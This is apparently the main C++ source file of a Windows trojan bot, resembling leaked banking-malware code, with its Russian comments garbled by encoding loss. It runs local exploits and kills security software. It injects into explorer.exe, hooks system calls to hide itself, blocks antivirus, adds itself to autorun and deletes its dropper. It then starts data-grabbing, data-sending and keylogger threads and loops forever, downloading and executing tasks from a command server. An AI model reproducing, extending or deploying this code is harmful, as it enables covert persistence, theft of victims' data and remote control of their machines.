#include <windows.h>



#include "BotCore.h"
#include "DllLoader.h"

#include "Utils.h"
#include "Exploit.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Loader.h"
#include "Config.h"
#include "Crypt.h"
#include "FtpSniffer.h"
#include "AvBlock.h"
#include "ntdll.h"
#include "BotEvents.h"
#include "Task.h"
#include "md5.h"

#include "Modules.h"

#include "BotDebug.h"


//********************** ���������� ������� **********************************

namespace MAINDBGTEMPLATES
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define MDBG MAINDBGTEMPLATES::DBGOutMessage<>


//***************************************************************************


#pragma comment(linker, "/ENTRY:MyMain" )




WCHAR TempFileName[ MAX_PATH ]; //���� ���� ��� ���������� � ������������
WCHAR FileToDelete[ MAX_PATH ]; //���� ��� �������� ��������������� ����� ����

DWORD dwKillPid		 = 0; //��� ��� �������� �������� ����
DWORD dwFirst	     = 0; //������ � ������ ���
DWORD dwAlreadyRun   = 0; //���� ��� ��������
DWORD dwGrabberRun	 = 0; //��������� �� �������
DWORD dwExplorerSelf = 0; //���� ������ ��� � ����������� ���������
//DWORD dwExplorerPid  = 0; //��� ����������

//�������� ��� ����������


void InternalAddToAutorun()
{
	// ��������� ��������� � ������������
	// ������ � ������ ���� � ������� �� ��������������� �������
	// ��������������� �� �������� ��������� �������
	#ifndef DEBUGBOT
	if (!WSTR::IsEmpty(TempFileName))
	{
		const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
		HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
		if (Mutex != NULL)
		{
				pCloseHandle(Mutex);
				MDBG("Main", "������ ����������. ���������� ���������� � ������������.");
				return;
		}

		MDBG("Main", "��������� ��� � ������������.");
		PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
		BOT::AddToAutoRun(Name);
		STR::Free(Name);
	}
	#endif

}

void DeleteDropper() // ������� �������, ������� ����
{
	if ( dwKillPid != 0 && !WSTR::IsEmpty(FileToDelete))
	{
		MDBG("Main", "������� ������");
		pWinStationTerminateProcess(NULL, dwKillPid, DBG_TERMINATE_PROCESS );	
		pSetFileAttributesW( FileToDelete, FILE_ATTRIBUTE_ARCHIVE );
		pDeleteFileW(FileToDelete);
	}
}

DWORD WINAPI LoaderRoutine( LPVOID lpData )
{
	BOT::Initialize();
	
	MDBG("Main", "*************** LoaderRoutine ***************");

	UnhookDlls();
	BOT::Protect(NULL);

	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();

	// �������� �������
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		// ������� ������� svchost
		pExitProcess(1);
		return 0; // ��� �����������
	}

	// �������� ����� �������� ������

	DataGrabber::StartDataSender();

	// �������� ����� ���������� ������ ��������� ���������
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;
	
	if (InitializeTaskManager(NULL, true))
	{
		MDBG("Main", "=====>> �������� ���������� ������");

		PCHAR URL;
		while (true)
		{
			MDBG("Main", "=====>> ��������� �������:");

			URL = GetBotScriptURL(SCRIPT_TASK);
			
			// ��������� � ��������� �������
			if (URL != NULL)
			{
				MDBG("Main", URL);
				DownloadAndExecuteCommand(NULL, URL);
				STR::Free(URL);
			}
			else
				MDBG("Main", "=====>> ������: ������ �� ��������!");

			// "������������" �������������� ����������� ���� � ��� �������
			// �������� ��������� ���������� ������ ���� ������ ����� ���������
			// �������
			if (!FirstSended)
			{
				MDBG("Main", "=====>> ���������� ���������� � �������");
				FirstSended = SendFirstInfo();
			}

			// ���������������� ���������� ������
			if (!TaskManagerSleep(NULL))
				break;
		}

    }
	return 0;
}


void ExplorerMain()
{
	MDBG("Main", "----------------- ExplorerMain -----------------");
	

	if ( !dwExplorerSelf )
		UnhookDlls();

	// ��������� ����������� ������ ��� ����� ��������
	//DisableShowFatalErrorDialog();

	InternalAddToAutorun();

	DeleteDropper();

	HookZwResumeThread();
	HookZwQueryDirectoryFile();

	

	//----------------------------------------------------

	if ( !dwAlreadyRun )
		MegaJump( LoaderRoutine );
	
	#ifdef GrabberH
		if ( dwFirst && !dwGrabberRun )
			MegaJump( GrabberThread );
	#endif


	MegaJump(AvFuckThread);


	// �������� ������� ������ ����������

	if (dwFirst)
		ExplorerFirstStart(NULL);
	ExplorerStart(NULL);

}

DWORD WINAPI ExplorerRoutine( LPVOID lpData )
{
	BOT::Initialize();


	UnhookDlls();
	
	if (dwExplorerSelf) 
	{
		//���� ������ ��� � ���� ��������� �����������	

		dwExplorerSelf = 0;

		if (!InjectIntoExplorer(ExplorerRoutine))
		{
			ExplorerMain();
		}

		pExitProcess(1);
	}

	ExplorerMain();

	return 0;
}


int APIENTRY MyMain() 
{

	BOT::Initialize();


	#if defined(DEBUGBOT) && defined(DebugUtils)
		if (!StartInDebugingMode(true))
			return 0;
	#endif



	UnhookDlls(); //������� ����

	WCHAR ModulePath[MAX_PATH];

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );

	DWORD dwProcessHash = File::GetNameHashW(ModulePath, false);

	if ( dwProcessHash == BOT::GetBotExeNameHash()) // ������ �� ������ ����
	{
		KillOutpost();
		DWORD dwExploits = DoExploits();

		if ( !dwExploits )
		{
			if ( MegaJump( LoaderRoutine ) )
			{
				dwAlreadyRun = 1;
			}
		}

		dwExplorerSelf = 1;

		if ( !JmpToExplorer( ExplorerRoutine ) )
		{
			dwExplorerSelf = 0;

			if ( !InjectIntoExplorer( ExplorerRoutine ) && !dwAlreadyRun )
			{
				MegaJump( LoaderRoutine );
			}
		}		
	}
	else
	{
		dwFirst = 1;

		KillOutpost();
		DWORD dwExploits = DoExploits();

		if ( !dwExploits )
		{
			if (MegaJump(LoaderRoutine))
			{
				dwAlreadyRun = 1;
			}

			#ifdef GrabberH
				if ( MegaJump( GrabberThread ) )
					dwGrabberRun = 1;
			#endif 
		}
				
		m_wcsncpy(FileToDelete, ModulePath, m_wcslen( ModulePath ) );
		dwKillPid = (DWORD)pGetCurrentProcessId();
		CopyFileToTemp( ModulePath, TempFileName );	

		dwExplorerSelf = 1;

		if (!JmpToExplorer(ExplorerRoutine ) )
		{
			dwExplorerSelf = 0;

			InternalAddToAutorun();
		}
	}

	pExitProcess(1);

	return 0;
}